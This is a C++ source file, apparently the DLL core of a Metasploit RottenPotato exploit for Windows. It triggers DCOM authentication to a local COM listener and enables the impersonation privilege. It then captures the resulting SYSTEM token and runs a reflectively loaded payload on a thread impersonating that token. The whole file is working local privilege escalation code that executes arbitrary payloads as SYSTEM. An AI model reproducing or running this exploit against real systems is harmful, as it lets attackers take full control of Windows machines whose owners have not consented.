#include "stdafx.h"
#include "ReflectiveLoader.h"
#include "MSFRottenPotato.h"

extern "C" HINSTANCE hAppInstance;
EXTERN_C IMAGE_DOS_HEADER __ImageBase;

HANDLE ElevatedToken;

VOID ExecutePayload(LPVOID lpPayload)
{
	printf("[+] Executing payload\n");
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
}

int RottenPotato()
{
	CMSFRottenPotato* test = new CMSFRottenPotato();
	test->startCOMListenerThread();
	test->startRPCConnectionThread();
	test->triggerDCOM();
	int ret = 0;
	while (true) {
		if (test->negotiator->authResult != -1) {
			HANDLE hToken;
			TOKEN_PRIVILEGES tkp;



			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return 0;


			LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME,
				&tkp.Privileges[0].Luid);

			tkp.PrivilegeCount = 1;  
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;


			AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			QuerySecurityContextToken(test->negotiator->phContext, &ElevatedToken);

			break;
		}
		else {
			Sleep(500);
		}
	}
	return ret;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		RottenPotato();
		HANDLE Thread;
		DWORD threadID;
		printf("[*] Creating thread to run as SYSTEM\n");
		Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecutePayload, lpReserved, CREATE_SUSPENDED, &threadID);
		SetThreadToken(&Thread, ElevatedToken);
		ResumeThread(Thread);
		WaitForSingleObject(Thread, 0xFFFFFFFF);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
